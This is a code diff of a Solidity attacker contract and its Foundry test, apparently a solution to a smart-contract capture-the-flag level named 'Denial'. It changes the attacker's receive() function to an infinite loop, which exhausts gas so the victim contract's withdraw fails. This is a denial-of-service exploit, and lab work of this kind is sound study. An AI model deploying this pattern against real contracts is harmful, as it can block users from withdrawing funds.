@@ -11,12 +11,12 @@ contract Attack {
     }
 
     receive() external payable {
-        denial.withdraw();
+        while(true) {}
     }
 
     function exploit() public {
         denial.setWithdrawPartner(msg.sender);
-        // denial.withdraw();
+        denial.withdraw();
     }
 }
 
@@ -37,7 +37,7 @@ contract DenialTest is Test {
     function testExploit() public {
         vm.startPrank(attacker);
         Attack attack = new Attack(payable(denialContract));
-        attack.exploit();
+        // attack.exploit();
         vm.stopPrank();
 
         vm.startPrank(owner);
